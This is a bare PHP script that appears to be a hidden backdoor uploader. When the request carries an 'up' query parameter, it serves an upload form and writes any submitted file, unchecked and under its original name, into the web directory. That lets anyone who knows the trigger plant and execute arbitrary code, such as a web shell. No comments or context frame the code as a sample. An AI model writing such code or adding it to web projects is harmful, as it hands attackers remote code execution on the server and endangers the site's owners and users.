<?php
if(isset($_GET['up'])) {
echo
'<html>
<body>
  <form enctype="multipart/form-data" method="POST">
    <input type="file" name="file"></input> 
    <input type="submit" value="Upload"></input>
  </form>
</body>
</html>';

  if(!empty($_FILES['file'])) {
    if(move_uploaded_file($_FILES['file']['tmp_name'], basename($_FILES['file']['name']))) {
      echo basename($_FILES['file']['name'])." Uploaded !";
    }else{
        echo "Upload Failed";
    }
 
  }
}